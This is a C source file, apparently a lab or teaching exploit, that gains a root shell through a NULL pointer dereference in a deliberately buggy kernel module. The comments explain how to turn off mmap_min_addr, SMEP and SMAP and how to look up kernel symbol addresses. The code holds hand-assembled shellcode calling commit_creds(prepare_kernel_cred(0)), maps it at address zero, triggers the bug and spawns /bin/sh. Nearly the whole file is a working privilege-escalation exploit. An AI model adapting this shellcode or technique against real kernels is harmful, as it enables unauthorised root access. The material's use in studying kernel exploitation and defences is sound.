/**
 * payload.c	- Kernel exploit to get root shell from NULL pointer dref.
 *
 * Author: Sougata Santra <sougata@tuxera.com>
 */
#include <sys/types.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

/**
 * Prerequisite:
 *
 * i )  Disable mmap_min_addr:
 * Kernel protects NULL ptr OOPS my protecting lower memory
 * addresses. Please see CONFIG_DEFAULT_MMAP_MIN_ADDR
 * 
 * We set it to zero for our exploit to work:
 * $ echo sh -c "echo 0 > /proc/sys/vm/mmap_min_addr"
 *
 * ii)  Disable processor protection SMEP and SMAP.
 *  We pass nosmap nosmep to kernel parameters.
 *  See: https://www.kernel.org/doc/Documentation/kernel-parameters.txt
 *
 * iii) Insmod our buggy kernel module that causes the NULL pointer dref.
 *
 * How the exploit is done:
 *
 * i) We find out the absolute address of the kernel symbols that we choose
 * to call.
 *
 * $ egrep 'commit_creds|prepare_kernel_cred' /proc/kallsyms 
 * ffffffff810c4540 T prepare_kernel_cred
 * ffffffff810c4150 T commit_creds
 *
 * We have to call commit_creds(prepare_kernel_cred(NULL));
 *
 * ii) We generate the necessary assembly code to call the above functions.
 *
 * $ echo 'asm("xorq %rax, %rax\n mov $0xffffffff810c4540,%rax\n
 *	mov $0x0,%edi\n call *%rax\n mov $0xffffffff810c4150,%rax\n
 *	call *%rax\n ret");' > test.c
 * $ gcc -c test.c
 * $ objdump -d test.o
 *
 * test.o:     file format elf64-x86-64
 * Disassembly of section .text:
 * 0000000000000000 <.text>:
 * 0:	48 31 c0		xor    %rax,%rax
 * 3:	48 c7 c0 40 45 0c 81	mov    $0xffffffff810c4540,%rax
 * a:	bf 00 00 00 00		mov    $0x0,%edi
 * f:	ff d0			callq  *%rax
 * 11:	48 c7 c0 50 41 0c 81	mov    $0xffffffff810c4150,%rax
 * 18:	ff d0			callq  *%rax
 * 1a:	c3			retq
 *
 * iii) We copy the payload to where RIP points after the NULL pointer
 * dereference. In this case it is 0x0.
 */

char payload[] =
	"\x48\x31\xc0"			/* xor    %rax,%rax		   */
	"\x48\xc7\xc0\x40\x45\x0c\x81"	/* mov    $0xffffffff810c4540,%rax */
	"\xbf\x00\x00\x00\x00"		/* mov    $0x0,%edi		   */
	"\xff\xd0"			/* callq  *%rax			   */
	"\x48\xc7\xc0\x50\x41\x0c\x81"	/* mov    $0xffffffff810c4150,%rax */
	"\xff\xd0"			/* callq  *%rax			   */
	"\xc3";				/* retq				   */

int main(void)
{
	int fd;
	mmap(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,
		MAP_FIXED|MAP_PRIVATE|MAP_ANON, -1, 0);
	memcpy(0, payload, sizeof(payload));
	fd = open("/proc/dref", O_WRONLY);
	write(fd, "foo", 3);
	system("/bin/sh");
	return 0;
}
